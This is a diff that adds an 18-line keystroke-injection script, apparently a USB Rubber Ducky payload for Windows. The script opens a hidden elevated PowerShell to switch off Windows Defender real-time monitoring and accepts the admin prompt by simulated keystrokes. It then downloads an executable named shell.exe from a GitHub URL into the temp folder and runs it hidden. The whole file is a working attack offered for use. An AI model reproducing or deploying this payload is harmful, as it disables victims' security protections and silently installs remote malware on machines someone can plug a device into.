@@ -1,0 +1,18 @@
+REM Disable Windows Defender (needs admin)
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList 'Set-MpPreference -DisableRealtimeMonitoring $true'"
+ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 1000
+ALT y
+
+REM Download and run payload stealthily
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -w hidden -c "Invoke-WebRequest -Uri 'https://github.com/DADZU1/Payload/raw/main/shell.exe' -OutFile $env:TEMP\payload.exe; Start-Sleep 2; Start-Process -WindowStyle Hidden $env:TEMP\payload.exe"
+ENTER
